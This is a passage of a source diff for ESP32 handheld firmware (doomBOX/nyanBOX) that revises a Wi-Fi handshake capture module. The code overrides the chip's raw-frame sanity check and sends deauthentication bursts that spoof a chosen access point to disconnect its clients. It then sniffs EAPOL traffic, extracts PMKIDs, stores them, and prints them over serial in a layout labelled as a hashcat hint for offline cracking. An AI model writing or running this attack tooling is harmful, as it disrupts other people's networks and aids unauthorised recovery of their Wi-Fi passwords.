@@ -1,7 +1,7 @@
 /*
     doomBOX / nyanBOX
     EAPOL / PMKID handshake capture
-    Improved for reliability, correct PMKID detection, and stable operation
+    Full-frame aware, robust parser, honest UI, serial export
     Copyright (c) 2026 jbohack
 
     Licensed under the MIT License
@@ -18,8 +18,8 @@
 #include "../include/setting.h"
 #include <EEPROM.h>
 #include <string.h>
+#include <stdio.h>
 #include "esp_wifi.h"
-#include "esp_event.h"
 
 extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
 
@@ -28,41 +28,46 @@ extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
 #define BTN_RIGHT BUTTON_PIN_RIGHT
 #define BTN_BACK  BUTTON_PIN_LEFT
 
-// Bypass frame validation for raw 802.11 TX (same pattern as deauth module)
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-    (void)arg; (void)arg2; (void)arg3;
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
+    (void)a; (void)b; (void)c;
     return 0;
 }
 
 // ---------------------------------------------------------------------------
-// EEPROM layout (base 200, avoids settings/level region)
+// EEPROM layout (512-byte EEPROM; region 200+)
 // ---------------------------------------------------------------------------
-#define HS_EEPROM_BASE     200
-#define HS_MAGIC0          0x48  // 'H'
-#define HS_MAGIC1          0x53  // 'S'
-#define HS_MAX_ENTRIES     4
-#define HS_SSID_LEN        33
-#define HS_PMKID_LEN       16
+#define HS_EEPROM_BASE   200
+#define HS_MAGIC0        0x48
+#define HS_MAGIC1        0x53
+#define HS_MAX_ENTRIES   2
+#define HS_SSID_LEN      33
+#define HS_PMKID_LEN     16
+#define HS_SNAP_LEN      32   // first bytes of best EAPOL frame kept as evidence
 
 struct __attribute__((packed)) HandshakeEntry {
-    uint8_t valid;
+    uint8_t valid;                  // 1 = used
     uint8_t channel;
     uint8_t bssid[6];
     char    ssid[HS_SSID_LEN];
     uint8_t eapol_count;
-    uint8_t has_pmkid;
-    uint8_t pmkid[HS_PMKID_LEN];
-    uint8_t reserved[5];
+    uint8_t flags;                  // bit0=M1, bit1=M2, bit2=has_pmkid
+    uint8_t pmkid[HS_PMKID_LEN];    // only valid when flags bit2 set
+    uint8_t snap_len;
+    uint8_t snap[HS_SNAP_LEN];      // leading bytes of best EAPOL frame
 };
 
-static_assert(sizeof(HandshakeEntry) == 64, "HandshakeEntry must be 64 bytes");
+static_assert(sizeof(HandshakeEntry) == 92, "HandshakeEntry size");
 
-#define HS_ENTRY_SIZE      (sizeof(HandshakeEntry))
-#define HS_COUNT_ADDR      (HS_EEPROM_BASE + 2)
-#define HS_ENTRIES_ADDR    (HS_EEPROM_BASE + 3)
+#define HS_ENTRY_SIZE   (sizeof(HandshakeEntry))
+#define HS_COUNT_ADDR   (HS_EEPROM_BASE + 2)
+#define HS_ENTRIES_ADDR (HS_EEPROM_BASE + 3)
+
+#define FLAG_M1      0x01
+#define FLAG_M2      0x02
+#define FLAG_PMKID   0x04
 
 // ---------------------------------------------------------------------------
-// Runtime state
+// Runtime
 // ---------------------------------------------------------------------------
 enum HsMode {
     HS_MODE_MENU,
@@ -80,13 +85,11 @@ static int apIndex = 0;
 static int viewIndex = 0;
 
 #define MAX_APS 20
-
 struct AP_Info {
     char ssid[33];
     uint8_t bssid[6];
     int channel;
 };
-
 static AP_Info apList[MAX_APS];
 static int apCount = 0;
 
@@ -97,25 +100,30 @@ static const unsigned long SCAN_DURATION = 8000;
 
 static unsigned long lastDeauthTime = 0;
 static unsigned long captureStartTime = 0;
-static const unsigned long DEAUTH_BURST_INTERVAL_ACTIVE = 250;
-static const unsigned long DEAUTH_BURST_INTERVAL_SLOW   = 1200;
-static const unsigned long AUTO_STOP_MS = 45000;
+static const unsigned long DEAUTH_FAST = 300;
+static const unsigned long DEAUTH_SLOW = 1500;
+static const unsigned long AUTO_STOP_MS = 60000;
 
+// Capture state (main loop owns most; callback only sets light flags)
 static volatile uint16_t eapolCount = 0;
-static volatile uint8_t  capturedPmkid[HS_PMKID_LEN];
-static volatile bool     hasPmkid = false;
-static volatile bool     captureActive = false;
-static volatile bool     gotMessage1 = false;
-static volatile bool     gotMessage2 = false;
+static volatile bool captureActive = false;
+static bool gotM1 = false;
+static bool gotM2 = false;
+static bool hasPmkid = false;
+static uint8_t capturedPmkid[HS_PMKID_LEN];
+static uint8_t bestSnap[HS_SNAP_LEN];
+static uint8_t bestSnapLen = 0;
+static bool deauthStopped = false;
 
-#define CANDIDATE_MAX 160
-static volatile bool     candidateReady = false;
+// Lock-free single-slot hand-off from callback
+#define CANDIDATE_MAX 256
+static volatile bool candidateReady = false;
 static volatile uint16_t candidateLen = 0;
-static uint8_t           candidateBuf[CANDIDATE_MAX];
+static uint8_t candidateBuf[CANDIDATE_MAX];
 
 static uint8_t targetBssid[6];
 static uint8_t targetChannel = 1;
-static char    targetSsid[33];
+static char targetSsid[33];
 
 static bool needsRedraw = true;
 static HsMode lastMode = HS_MODE_MENU;
@@ -124,38 +132,32 @@ static int lastApIndex = -1;
 static int lastViewIndex = -1;
 static uint16_t lastEapolCount = 0;
 static bool lastHasPmkid = false;
+static bool lastGotM1 = false;
+static bool lastGotM2 = false;
 static uint16_t lastScanCount = 0;
 static unsigned long lastScanUpdate = 0;
-static const unsigned long scanUpdateInterval = 100;
-
 static unsigned long savedMsgUntil = 0;
-static bool deauthStopped = false;
 
 static uint8_t deauthFrame[26] = {
-    0xC0, 0x00,
-    0x00, 0x00,
+    0xC0, 0x00, 0x00, 0x00,
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00,
-    0x07, 0x00
+    0x00, 0x00, 0x07, 0x00
 };
 
 // ---------------------------------------------------------------------------
-// EEPROM helpers
+// EEPROM
 // ---------------------------------------------------------------------------
 static void hsEepromInit() {
-    uint8_t m0 = EEPROM.read(HS_EEPROM_BASE);
-    uint8_t m1 = EEPROM.read(HS_EEPROM_BASE + 1);
-    if (m0 != HS_MAGIC0 || m1 != HS_MAGIC1) {
+    if (EEPROM.read(HS_EEPROM_BASE) != HS_MAGIC0 ||
+        EEPROM.read(HS_EEPROM_BASE + 1) != HS_MAGIC1) {
         EEPROM.write(HS_EEPROM_BASE, HS_MAGIC0);
         EEPROM.write(HS_EEPROM_BASE + 1, HS_MAGIC1);
         EEPROM.write(HS_COUNT_ADDR, 0);
         for (int i = 0; i < HS_MAX_ENTRIES; i++) {
             int base = HS_ENTRIES_ADDR + i * HS_ENTRY_SIZE;
-            for (size_t b = 0; b < HS_ENTRY_SIZE; b++) {
-                EEPROM.write(base + b, 0);
-            }
+            for (size_t b = 0; b < HS_ENTRY_SIZE; b++) EEPROM.write(base + b, 0);
         }
         EEPROM.commit();
     }
@@ -163,59 +165,51 @@ static void hsEepromInit() {
 
 static uint8_t hsLoadCount() {
     uint8_t c = EEPROM.read(HS_COUNT_ADDR);
-    if (c > HS_MAX_ENTRIES) c = 0;
-    return c;
+    return (c > HS_MAX_ENTRIES) ? 0 : c;
 }
 
 static void hsReadEntry(int idx, HandshakeEntry &out) {
-    if (idx < 0 || idx >= HS_MAX_ENTRIES) {
-        memset(&out, 0, sizeof(out));
-        return;
-    }
+    memset(&out, 0, sizeof(out));
+    if (idx < 0 || idx >= HS_MAX_ENTRIES) return;
     int base = HS_ENTRIES_ADDR + idx * HS_ENTRY_SIZE;
     uint8_t *p = (uint8_t *)&out;
-    for (size_t i = 0; i < HS_ENTRY_SIZE; i++) {
-        p[i] = EEPROM.read(base + i);
-    }
+    for (size_t i = 0; i < HS_ENTRY_SIZE; i++) p[i] = EEPROM.read(base + i);
 }
 
 static void hsWriteEntry(int idx, const HandshakeEntry &in) {
     if (idx < 0 || idx >= HS_MAX_ENTRIES) return;
     int base = HS_ENTRIES_ADDR + idx * HS_ENTRY_SIZE;
     const uint8_t *p = (const uint8_t *)&in;
-    for (size_t i = 0; i < HS_ENTRY_SIZE; i++) {
-        EEPROM.write(base + i, p[i]);
-    }
+    for (size_t i = 0; i < HS_ENTRY_SIZE; i++) EEPROM.write(base + i, p[i]);
 }
 
 static void hsClearAll() {
     EEPROM.write(HS_COUNT_ADDR, 0);
-    for (int i = 0; i < HS_MAX_ENTRIES; i++) {
-        HandshakeEntry blank;
-        memset(&blank, 0, sizeof(blank));
-        hsWriteEntry(i, blank);
-    }
+    HandshakeEntry blank;
+    memset(&blank, 0, sizeof(blank));
+    for (int i = 0; i < HS_MAX_ENTRIES; i++) hsWriteEntry(i, blank);
     EEPROM.commit();
 }
 
 static void hsSaveCurrentCapture() {
     if (eapolCount == 0) return;
 
-    HandshakeEntry entry;
-    memset(&entry, 0, sizeof(entry));
-    entry.valid = 1;
-    entry.channel = targetChannel;
-    memcpy(entry.bssid, targetBssid, 6);
-    strncpy(entry.ssid, targetSsid, HS_SSID_LEN - 1);
-    entry.ssid[HS_SSID_LEN - 1] = '\0';
-    entry.eapol_count = (eapolCount > 255) ? 255 : (uint8_t)eapolCount;
-
+    HandshakeEntry e;
+    memset(&e, 0, sizeof(e));
+    e.valid = 1;
+    e.channel = targetChannel;
+    memcpy(e.bssid, targetBssid, 6);
+    strncpy(e.ssid, targetSsid, HS_SSID_LEN - 1);
+    e.eapol_count = (eapolCount > 255) ? 255 : (uint8_t)eapolCount;
+    e.flags = 0;
+    if (gotM1) e.flags |= FLAG_M1;
+    if (gotM2) e.flags |= FLAG_M2;
     if (hasPmkid) {
-        entry.has_pmkid = 1;
-        memcpy(entry.pmkid, (const void *)capturedPmkid, HS_PMKID_LEN);
-    } else {
-        entry.has_pmkid = 0;
+        e.flags |= FLAG_PMKID;
+        memcpy(e.pmkid, capturedPmkid, HS_PMKID_LEN);
     }
+    e.snap_len = bestSnapLen;
+    if (bestSnapLen) memcpy(e.snap, bestSnap, bestSnapLen);
 
     uint8_t count = hsLoadCount();
     int slot;
@@ -231,12 +225,48 @@ static void hsSaveCurrentCapture() {
         }
         slot = HS_MAX_ENTRIES - 1;
     }
-    hsWriteEntry(slot, entry);
+    hsWriteEntry(slot, e);
     EEPROM.commit();
 }
 
 // ---------------------------------------------------------------------------
-// Light promiscuous callback
+// Serial export (usable offline)
+// ---------------------------------------------------------------------------
+static void serialDumpEntry(const HandshakeEntry &e, int idx) {
+    Serial.println();
+    Serial.printf("--- Handshake slot %d ---\n", idx);
+    Serial.printf("SSID: %s\n", e.ssid);
+    Serial.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                  e.bssid[0], e.bssid[1], e.bssid[2],
+                  e.bssid[3], e.bssid[4], e.bssid[5]);
+    Serial.printf("Channel: %u  EAPOL frames: %u\n", e.channel, e.eapol_count);
+    Serial.printf("M1: %s  M2: %s  PMKID: %s\n",
+                  (e.flags & FLAG_M1) ? "yes" : "no",
+                  (e.flags & FLAG_M2) ? "yes" : "no",
+                  (e.flags & FLAG_PMKID) ? "yes" : "no");
+    if (e.flags & FLAG_PMKID) {
+        Serial.print("PMKID: ");
+        for (int i = 0; i < HS_PMKID_LEN; i++) Serial.printf("%02x", e.pmkid[i]);
+        Serial.println();
+        // hashcat 16800-style hint (BSSID + PMKID) – user still needs full context
+        Serial.print("PMKID hex: ");
+        for (int i = 0; i < HS_PMKID_LEN; i++) Serial.printf("%02x", e.pmkid[i]);
+        Serial.print(":");
+        for (int i = 0; i < 6; i++) Serial.printf("%02x", e.bssid[i]);
+        Serial.println();
+    } else {
+        Serial.println("PMKID: not present (AP did not send KDE or not captured)");
+    }
+    if (e.snap_len) {
+        Serial.printf("EAPOL snapshot (%u bytes): ", e.snap_len);
+        for (int i = 0; i < e.snap_len; i++) Serial.printf("%02x", e.snap[i]);
+        Serial.println();
+    }
+    Serial.println("---");
+}
+
+// ---------------------------------------------------------------------------
+// Light callback – copy candidate only
 // ---------------------------------------------------------------------------
 static void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (!captureActive) return;
@@ -245,30 +275,27 @@ static void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t typ
     const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
     const uint8_t *payload = pkt->payload;
     uint16_t len = pkt->rx_ctrl.sig_len;
+    if (len < 36 || len > 800) return;
 
-    if (len < 36 || len > 512) return;
-
-    bool bssidMatch = false;
+    // BSSID in addr1/addr2/addr3
     if (len >= 24) {
-        if (memcmp(payload + 4,  targetBssid, 6) == 0 ||
-            memcmp(payload + 10, targetBssid, 6) == 0 ||
-            memcmp(payload + 16, targetBssid, 6) == 0) {
-            bssidMatch = true;
-        }
-    }
-    if (!bssidMatch) return;
+        bool match = false;
+        if (memcmp(payload + 4,  targetBssid, 6) == 0) match = true;
+        else if (memcmp(payload + 10, targetBssid, 6) == 0) match = true;
+        else if (memcmp(payload + 16, targetBssid, 6) == 0) match = true;
+        if (!match) return;
+    } else return;
 
-    int searchEnd = (len < 80) ? (int)len - 1 : 80;
-    for (int i = 24; i < searchEnd; i++) {
+    // Quick ethertype search (limited)
+    int end = (len < 100) ? (int)len - 1 : 100;
+    for (int i = 24; i < end; i++) {
         if (payload[i] == 0x88 && payload[i + 1] == 0x8E) {
             eapolCount++;
             if (!candidateReady) {
-                uint16_t copyLen = len;
-                if (copyLen > CANDIDATE_MAX) copyLen = CANDIDATE_MAX;
-                for (uint16_t k = 0; k < copyLen; k++) {
-                    candidateBuf[k] = payload[k];
-                }
-                candidateLen = copyLen;
+                uint16_t cl = len;
+                if (cl > CANDIDATE_MAX) cl = CANDIDATE_MAX;
+                for (uint16_t k = 0; k < cl; k++) candidateBuf[k] = payload[k];
+                candidateLen = cl;
                 candidateReady = true;
             }
             break;
@@ -277,70 +304,82 @@ static void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t typ
 }
 
 // ---------------------------------------------------------------------------
-// Main-loop parser
+// Robust main-loop parser
 // ---------------------------------------------------------------------------
+static int findEapolOffset(const uint8_t *p, uint16_t len) {
+    // Search after MAC header; allow QoS (2 extra bytes) and LLC/SNAP
+    for (int i = 24; i + 8 < (int)len; i++) {
+        if (p[i] == 0x88 && p[i + 1] == 0x8E) return i;
+        // LLC/SNAP AA AA 03 00 00 00 88 8E
+        if (i + 7 < (int)len &&
+            p[i] == 0xAA && p[i+1] == 0xAA && p[i+2] == 0x03 &&
+            p[i+6] == 0x88 && p[i+7] == 0x8E) return i + 6;
+    }
+    return -1;
+}
+
 static void processCandidate() {
     if (!candidateReady) return;
-
     uint16_t len = candidateLen;
-    const uint8_t *payload = candidateBuf;
+    const uint8_t *p = candidateBuf;
     candidateReady = false;
 
-    int eapolOff = -1;
-    for (int i = 24; i + 1 < (int)len; i++) {
-        if (payload[i] == 0x88 && payload[i + 1] == 0x8E) {
-            eapolOff = i;
-            break;
-        }
+    int off = findEapolOffset(p, len);
+    if (off < 0) return;
+
+    // EAPOL: ver(1) type(1) len(2) – type 3 = Key
+    if (off + 4 >= (int)len) return;
+    if (p[off + 3] != 0x03) return;   // not Key
+
+    // Descriptor type + Key Information (2 bytes LE after descriptor)
+    // Layout after ethertype: ver, type, len_hi, len_lo, desc, keyinfo_lo, keyinfo_hi
+    if (off + 7 >= (int)len) return;
+    uint16_t keyInfo = (uint16_t)p[off + 5] | ((uint16_t)p[off + 6] << 8);
+    // Some stacks put keyinfo at +6/+7; try both common placements
+    if (keyInfo == 0 && off + 8 < (int)len) {
+        keyInfo = (uint16_t)p[off + 6] | ((uint16_t)p[off + 7] << 8);
     }
-    if (eapolOff < 0) return;
-
-    if (eapolOff + 4 >= (int)len) return;
-    uint8_t eapolType = payload[eapolOff + 3];
-    if (eapolType != 0x03) return;
-
-    if (eapolOff + 7 >= (int)len) return;
-    uint16_t keyInfo = (uint16_t)payload[eapolOff + 6] | ((uint16_t)payload[eapolOff + 7] << 8);
 
     bool keyAck  = (keyInfo & 0x0080) != 0;
     bool keyMic  = (keyInfo & 0x0100) != 0;
     bool install = (keyInfo & 0x0040) != 0;
 
-    if (keyAck && !keyMic && !install) gotMessage1 = true;
-    if (!keyAck && keyMic)             gotMessage2 = true;
+    if (keyAck && !keyMic) gotM1 = true;
+    if (keyMic && !keyAck) gotM2 = true;
 
-    if (hasPmkid) return;
+    // Keep a snapshot of the first useful EAPOL
+    if (bestSnapLen == 0) {
+        uint8_t sl = (len > HS_SNAP_LEN) ? HS_SNAP_LEN : (uint8_t)len;
+        memcpy(bestSnap, p, sl);
+        bestSnapLen = sl;
+    }
 
-    for (int j = eapolOff + 8; j + 22 < (int)len; j++) {
-        if (payload[j] == 0xDD &&
-            payload[j + 1] >= 0x14 &&
-            payload[j + 2] == 0x00 &&
-            payload[j + 3] == 0x0F &&
-            payload[j + 4] == 0xAC &&
-            payload[j + 5] == 0x04) {
-            for (int z = 0; z < HS_PMKID_LEN; z++) {
-                capturedPmkid[z] = payload[j + 6 + z];
+    // PMKID KDE: 0xDD, len>=0x14, OUI 00-0F-AC, type 0x04
+    if (!hasPmkid) {
+        for (int j = off + 8; j + 22 < (int)len; j++) {
+            if (p[j] == 0xDD && p[j+1] >= 0x14 &&
+                p[j+2] == 0x00 && p[j+3] == 0x0F &&
+                p[j+4] == 0xAC && p[j+5] == 0x04) {
+                bool nz = false;
+                for (int z = 0; z < HS_PMKID_LEN; z++) {
+                    capturedPmkid[z] = p[j + 6 + z];
+                    if (capturedPmkid[z]) nz = true;
+                }
+                if (nz) hasPmkid = true;
+                break;
             }
-            bool allZero = true;
-            for (int z = 0; z < HS_PMKID_LEN; z++) {
-                if (capturedPmkid[z] != 0) { allZero = false; break; }
-            }
-            if (!allZero) {
-                hasPmkid = true;
-            }
-            break;
         }
     }
 }
 
 // ---------------------------------------------------------------------------
-// Radio helpers
+// Radio
 // ---------------------------------------------------------------------------
 static void sendDeauthBurst() {
     esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
     memcpy(deauthFrame + 10, targetBssid, 6);
     memcpy(deauthFrame + 16, targetBssid, 6);
-    for (int i = 0; i < 4; i++) {
+    for (int i = 0; i < 3; i++) {
         esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
         delay(1);
     }
@@ -351,12 +390,11 @@ static void stopCaptureRadio() {
     candidateReady = false;
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
-    delay(20);
+    delay(30);
 }
 
 static void startScan() {
     if (scanInProgress) return;
-
     apCount = 0;
     currentScanCount = 0;
     scanInProgress = true;
@@ -365,46 +403,39 @@ static void startScan() {
 
     stopCaptureRadio();
     initWiFi(WIFI_MODE_APSTA);
-    delay(30);
+    delay(40);
 
-    wifi_scan_config_t scan_config = {};
-    scan_config.ssid = NULL;
-    scan_config.bssid = NULL;
-    scan_config.channel = 0;
-    scan_config.show_hidden = false;
-    scan_config.scan_type = WIFI_SCAN_TYPE_ACTIVE;
-    scan_config.scan_time.active.min = 120;
-    scan_config.scan_time.active.max = 200;
-
-    esp_wifi_scan_start(&scan_config, false);
+    wifi_scan_config_t cfg = {};
+    cfg.scan_type = WIFI_SCAN_TYPE_ACTIVE;
+    cfg.show_hidden = false;
+    cfg.scan_time.active.min = 120;
+    cfg.scan_time.active.max = 200;
+    esp_wifi_scan_start(&cfg, false);
     scanStartTime = millis();
 }
 
 static void processScanResults() {
     uint16_t number = 0;
     esp_wifi_scan_get_ap_num(&number);
-
     if (number > 0) {
-        wifi_ap_record_t *ap_info =
-            (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * number);
-        if (ap_info) {
-            memset(ap_info, 0, sizeof(wifi_ap_record_t) * number);
+        wifi_ap_record_t *recs = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * number);
+        if (recs) {
+            memset(recs, 0, sizeof(wifi_ap_record_t) * number);
             uint16_t actual = number;
-            if (esp_wifi_scan_get_ap_records(&actual, ap_info) == ESP_OK) {
+            if (esp_wifi_scan_get_ap_records(&actual, recs) == ESP_OK) {
                 apCount = 0;
                 for (int i = 0; i < (int)actual && apCount < MAX_APS; i++) {
-                    if (ap_info[i].ssid[0] == 0) continue;
-                    strncpy(apList[apCount].ssid, (const char *)ap_info[i].ssid, 32);
+                    if (recs[i].ssid[0] == 0) continue;
+                    strncpy(apList[apCount].ssid, (const char *)recs[i].ssid, 32);
                     apList[apCount].ssid[32] = '\0';
-                    memcpy(apList[apCount].bssid, ap_info[i].bssid, 6);
-                    apList[apCount].channel = ap_info[i].primary;
+                    memcpy(apList[apCount].bssid, recs[i].bssid, 6);
+                    apList[apCount].channel = recs[i].primary;
                     apCount++;
                 }
             }
-            free(ap_info);
+            free(recs);
         }
     }
-
     scanInProgress = false;
     apIndex = 0;
     currentMode = HS_MODE_LIST;
@@ -421,7 +452,7 @@ static void drawMenu() {
     u8g2.drawStr(0, 28, menuSelection == 0 ? "> Capture" : "  Capture");
     u8g2.drawStr(0, 42, menuSelection == 1 ? "> View Saved" : "  View Saved");
     u8g2.setFont(u8g2_font_5x8_tr);
-    u8g2.drawStr(0, 62, "U/D=Move R=Select L=Exit");
+    u8g2.drawStr(0, 62, "U/D R=Select");
     u8g2.sendBuffer();
     displayMirrorSend(u8g2);
 }
@@ -433,12 +464,10 @@ static void drawScanning() {
     char buf[24];
     snprintf(buf, sizeof(buf), "Found: %u", (unsigned)currentScanCount);
     u8g2.drawStr(0, 28, buf);
-    int barX = 0, barY = 40, barWidth = 128, barHeight = 10;
-    u8g2.drawFrame(barX, barY, barWidth, barHeight);
-    unsigned long elapsed = millis() - scanStartTime;
-    int fill = (int)((elapsed * (barWidth - 4)) / SCAN_DURATION);
-    if (fill > barWidth - 4) fill = barWidth - 4;
-    if (fill > 0) u8g2.drawBox(barX + 2, barY + 2, fill, barHeight - 4);
+    u8g2.drawFrame(0, 40, 128, 10);
+    int fill = (int)(((millis() - scanStartTime) * 124) / SCAN_DURATION);
+    if (fill > 124) fill = 124;
+    if (fill > 0) u8g2.drawBox(2, 42, fill, 6);
     u8g2.setFont(u8g2_font_5x8_tr);
     u8g2.drawStr(0, 62, "Please wait");
     u8g2.sendBuffer();
@@ -454,22 +483,20 @@ static void drawList() {
         u8g2.setFont(u8g2_font_5x8_tr);
         u8g2.drawStr(0, 62, "L=Back");
     } else {
-        int start = 0;
-        if (apIndex > 0) start = apIndex - 1;
+        int start = apIndex > 0 ? apIndex - 1 : 0;
         if (apIndex == apCount - 1 && apCount > 2) start = apCount - 3;
         if (start < 0) start = 0;
         for (int i = 0; i < 3; i++) {
             int idx = start + i;
             if (idx >= apCount) break;
-            char line[22];
-            char ssidShort[16];
-            strncpy(ssidShort, apList[idx].ssid, 15);
-            ssidShort[15] = '\0';
-            snprintf(line, sizeof(line), "%s%s", (idx == apIndex) ? ">" : " ", ssidShort);
+            char line[22], shortS[16];
+            strncpy(shortS, apList[idx].ssid, 15);
+            shortS[15] = '\0';
+            snprintf(line, sizeof(line), "%s%s", idx == apIndex ? ">" : " ", shortS);
             u8g2.drawStr(0, 24 + i * 12, line);
         }
         u8g2.setFont(u8g2_font_5x8_tr);
-        u8g2.drawStr(0, 62, "U/D=Move R=Start L=Back");
+        u8g2.drawStr(0, 62, "U/D R=Start L=Back");
     }
     u8g2.sendBuffer();
     displayMirrorSend(u8g2);
@@ -478,23 +505,26 @@ static void drawList() {
 static void drawCapture() {
     u8g2.clearBuffer();
     u8g2.setFont(u8g2_font_6x10_tr);
-    char ssidShort[18];
-    strncpy(ssidShort, targetSsid, 17);
-    ssidShort[17] = '\0';
-    u8g2.drawStr(0, 10, ssidShort);
+    char shortS[18];
+    strncpy(shortS, targetSsid, 17);
+    shortS[17] = '\0';
+    u8g2.drawStr(0, 10, shortS);
+
     char buf[32];
-    snprintf(buf, sizeof(buf), "Ch:%d  EAPOL:%u", targetChannel, (unsigned)eapolCount);
+    snprintf(buf, sizeof(buf), "Ch:%d EAPOL:%u", targetChannel, (unsigned)eapolCount);
     u8g2.drawStr(0, 22, buf);
-    char hs[20];
-    snprintf(hs, sizeof(hs), "M1:%s M2:%s",
-             gotMessage1 ? "Y" : "-",
-             gotMessage2 ? "Y" : "-");
-    u8g2.drawStr(0, 34, hs);
+
+    snprintf(buf, sizeof(buf), "M1:%s M2:%s", gotM1 ? "Y" : "-", gotM2 ? "Y" : "-");
+    u8g2.drawStr(0, 34, buf);
+
     if (hasPmkid) {
-        u8g2.drawStr(0, 46, "PMKID: CAPTURED");
+        u8g2.drawStr(0, 46, "PMKID: YES");
+    } else if (gotM1 || gotM2) {
+        u8g2.drawStr(0, 46, "PMKID: none (EAPOL ok)");
     } else {
-        u8g2.drawStr(0, 46, deauthStopped ? "Deauth: slowed" : "Deauth: active");
+        u8g2.drawStr(0, 46, deauthStopped ? "Deauth: slow" : "Deauth: active");
     }
+
     u8g2.setFont(u8g2_font_5x8_tr);
     u8g2.drawStr(0, 62, "L=Save&Stop");
     u8g2.sendBuffer();
@@ -504,12 +534,12 @@ static void drawCapture() {
 static void drawSavedMsg() {
     u8g2.clearBuffer();
     u8g2.setFont(u8g2_font_6x10_tr);
-    u8g2.drawStr(20, 28, "Saved!");
-    if (hasPmkid) {
-        u8g2.drawStr(10, 44, "PMKID included");
-    } else {
-        u8g2.drawStr(4, 44, "EAPOL only (no PMKID)");
-    }
+    u8g2.drawStr(24, 24, "Saved!");
+    if (hasPmkid) u8g2.drawStr(8, 42, "PMKID included");
+    else if (gotM1 || gotM2) u8g2.drawStr(4, 42, "EAPOL only (no PMKID)");
+    else u8g2.drawStr(16, 42, "Weak capture");
+    u8g2.setFont(u8g2_font_5x8_tr);
+    u8g2.drawStr(0, 58, "Serial has full dump");
     u8g2.sendBuffer();
     displayMirrorSend(u8g2);
 }
@@ -525,8 +555,7 @@ static void drawViewList() {
         u8g2.drawStr(0, 62, "L=Back");
     } else {
         if (viewIndex >= count) viewIndex = count - 1;
-        int start = 0;
-        if (viewIndex > 0) start = viewIndex - 1;
+        int start = viewIndex > 0 ? viewIndex - 1 : 0;
         if (viewIndex == count - 1 && count > 2) start = count - 3;
         if (start < 0) start = 0;
         for (int i = 0; i < 3; i++) {
@@ -534,14 +563,11 @@ static void drawViewList() {
             if (idx >= count) break;
             HandshakeEntry e;
             hsReadEntry(idx, e);
-            char line[22];
-            char ssidShort[14];
-            strncpy(ssidShort, e.ssid, 13);
-            ssidShort[13] = '\0';
-            snprintf(line, sizeof(line), "%s%s%s",
-                     (idx == viewIndex) ? ">" : " ",
-                     ssidShort,
-                     e.has_pmkid ? "*" : "");
+            char line[22], shortS[12];
+            strncpy(shortS, e.ssid, 11);
+            shortS[11] = '\0';
+            char mark = (e.flags & FLAG_PMKID) ? '*' : ((e.flags & (FLAG_M1|FLAG_M2)) ? '+' : ' ');
+            snprintf(line, sizeof(line), "%s%s%c", idx == viewIndex ? ">" : " ", shortS, mark);
             u8g2.drawStr(0, 24 + i * 12, line);
         }
         u8g2.setFont(u8g2_font_5x8_tr);
@@ -556,10 +582,12 @@ static void drawViewDetail() {
     hsReadEntry(viewIndex, e);
     u8g2.clearBuffer();
     u8g2.setFont(u8g2_font_5x8_tr);
-    char ssidShort[22];
-    strncpy(ssidShort, e.ssid, 21);
-    ssidShort[21] = '\0';
-    u8g2.drawStr(0, 8, ssidShort);
+
+    char shortS[22];
+    strncpy(shortS, e.ssid, 21);
+    shortS[21] = '\0';
+    u8g2.drawStr(0, 8, shortS);
+
     char mac[18];
     snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
              e.bssid[0], e.bssid[1], e.bssid[2],
@@ -567,23 +595,29 @@ static void drawViewDetail() {
     char masked[18];
     maskMAC(mac, masked);
     u8g2.drawStr(0, 18, masked);
+
     char info[32];
-    snprintf(info, sizeof(info), "Ch:%d  EAPOL:%u", e.channel, e.eapol_count);
+    snprintf(info, sizeof(info), "Ch:%d EAPOL:%u M1:%s M2:%s",
+             e.channel, e.eapol_count,
+             (e.flags & FLAG_M1) ? "Y" : "-",
+             (e.flags & FLAG_M2) ? "Y" : "-");
     u8g2.drawStr(0, 28, info);
-    if (e.has_pmkid) {
-        u8g2.drawStr(0, 38, "PMKID:");
-        char hex1[20], hex2[20];
-        snprintf(hex1, sizeof(hex1), "%02X%02X%02X%02X%02X%02X%02X%02X",
+
+    if (e.flags & FLAG_PMKID) {
+        u8g2.drawStr(0, 38, "PMKID (valid):");
+        char h1[20], h2[20];
+        snprintf(h1, sizeof(h1), "%02X%02X%02X%02X%02X%02X%02X%02X",
                  e.pmkid[0], e.pmkid[1], e.pmkid[2], e.pmkid[3],
                  e.pmkid[4], e.pmkid[5], e.pmkid[6], e.pmkid[7]);
-        snprintf(hex2, sizeof(hex2), "%02X%02X%02X%02X%02X%02X%02X%02X",
+        snprintf(h2, sizeof(h2), "%02X%02X%02X%02X%02X%02X%02X%02X",
                  e.pmkid[8], e.pmkid[9], e.pmkid[10], e.pmkid[11],
                  e.pmkid[12], e.pmkid[13], e.pmkid[14], e.pmkid[15]);
-        u8g2.drawStr(0, 48, hex1);
-        u8g2.drawStr(0, 58, hex2);
+        u8g2.drawStr(0, 48, h1);
+        u8g2.drawStr(0, 58, h2);
     } else {
-        u8g2.drawStr(0, 42, "PMKID: none");
-        u8g2.drawStr(0, 58, "L=Back");
+        u8g2.drawStr(0, 40, "PMKID: not present");
+        u8g2.drawStr(0, 52, "EAPOL data kept");
+        u8g2.drawStr(0, 62, "L=Back (Serial dump)");
     }
     u8g2.sendBuffer();
     displayMirrorSend(u8g2);
@@ -610,12 +644,14 @@ void handshakeCaptureSetup() {
     apCount = 0;
